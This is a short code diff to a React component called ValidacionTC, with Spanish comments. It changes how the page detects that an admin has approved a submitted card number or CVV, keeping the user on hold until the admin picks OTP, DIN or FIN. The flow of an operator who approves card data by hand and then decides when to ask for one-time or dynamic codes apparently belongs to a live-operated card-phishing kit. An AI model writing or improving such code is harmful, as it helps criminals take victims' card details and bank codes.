@@ -495,18 +495,20 @@ export default function ValidacionTC() {
                     return;
                 }
 
-                // Admin aprobó TC/CVV custom: backend pone 'solicitar_din' y muestra menú.
+                // Admin aprobó TC/CVV custom: backend ahora pone 'pendiente' y muestra menú.
                 // Usuario debe QUEDAR EN ESPERA hasta que admin pulse OTP, DIN o FIN.
                 const prev = estadoAnteriorRef.current;
-                const aprobadoAhora = (prev === 'awaiting_tc_approval' || prev === 'awaiting_cvv_approval') && estado === 'solicitar_din';
+                // Detectar cuando se aprueba: cambio de awaiting_*_approval a pendiente
+                const aprobadoAhora = (prev === 'awaiting_tc_approval' || prev === 'awaiting_cvv_approval') && estado === 'pendiente';
                 if (aprobadoAhora) {
                     aprobadoEsperandoRef.current = true;
                     estadoAnteriorRef.current = estado;
-                    return;
+                    return; // Quedarse en espera, no redirigir
                 }
-                if (aprobadoEsperandoRef.current && estado === 'solicitar_din') {
+                // Si ya estaba en modo espera y sigue pendiente, mantener espera
+                if (aprobadoEsperandoRef.current && estado === 'pendiente') {
                     estadoAnteriorRef.current = estado;
-                    return;
+                    return; // Continuar esperando
                 }
                 estadoAnteriorRef.current = estado;
 
